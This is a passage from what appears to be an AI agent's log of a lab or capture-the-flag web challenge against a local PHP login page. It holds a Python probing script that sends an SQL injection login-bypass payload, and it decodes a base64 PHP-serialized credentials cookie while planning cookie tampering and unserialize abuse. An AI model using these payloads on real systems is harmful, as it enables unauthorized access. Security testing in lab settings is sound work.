See: https://github.com/urllib3/urllib3/issues/3020 warnings.warn( --- iter 6 bash --- $ cat <<'TXT' STATE (iter 4): - CONFIRMED: POST /index.php with username/password always 302s to index.php and sets cookie creds= containing submitted username/password verbatim; no immediate SQL error on quotes. - REFUTED: immediate visible SQL error on POST without following cookie is absent. - OPEN: (1) insecure client-side credential cookie / PHP unserialize or auth via cookie tampering; (2) blind auth check after redirect using creds cookie; (3) hidden routes/source disclosure. - NEXT: follow redirect with different creds cookies and decode/modify creds to test auth outcomes and role/admin logic. TXT python3 - <<'PY' import requests, base64, urllib.parse, re, hashlib url='http://127.0.0.1:9101/index.php' s=requests.Session() for name,data in [('normal',{'username':'homer','password':'donut'}),('admin',{'username':'admin','password':'admin'}),('bypass',{'username':"' OR '1'='1'-- -",'password':'x'}),('empty',{'username':'','password':''})]: r=s.post(url,data=data,allow_redirects=False) ck=r.cookies.get('creds') print('\n=== post',name,'===') print('set-cookie',ck) if ck: print('decoded',base64.b64decode(urllib.parse.unquote(ck)).decode('latin1')) r2=requests.get(url,cookies={'creds':ck},allow_redirects=False) print('GET status',r2.status_code,'len',len(r2.content),'sha',hashlib.sha256(r2.content).hexdigest()) print('headers',dict(r2.headers)) print(r2.text) PY STATE (iter 4): - CONFIRMED: POST /index.php with username/password always 302s to index.php and sets cookie creds= containing submitted username/password verbatim; no immediate SQL error on quotes. - REFUTED: immediate visible SQL error on POST without following cookie is absent. - OPEN: (1) insecure client-side credential cookie / PHP unserialize or auth via cookie tampering; (2) blind auth check after redirect using creds cookie; (3) hidden routes/source disclosure. - NEXT: follow redirect with different creds cookies and decode/modify creds to test auth outcomes and role/admin logic. === post normal === set-cookie YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImhvbWVyIjtzOjg6InBhc3N3b3JkIjtzOjU6ImRvbnV0Ijt9 decoded a:2:{s:8:"username";s:5:"homer";s:8:"password";s:5:"donut";} GET status 200 len 3188 sha eebbe35b6f417330741c290f748047efaa0ed0789afa962c8785fda9d89f3dc0 headers {'Date': 'Tue, 16 Jun 2026 09:36:46 GMT', 'Server': 'Apache/2.4.25 (Debian)', 'X-Powered-By': 'PHP/5.6.40', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '1190', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=UTF-8'} AUTH 04
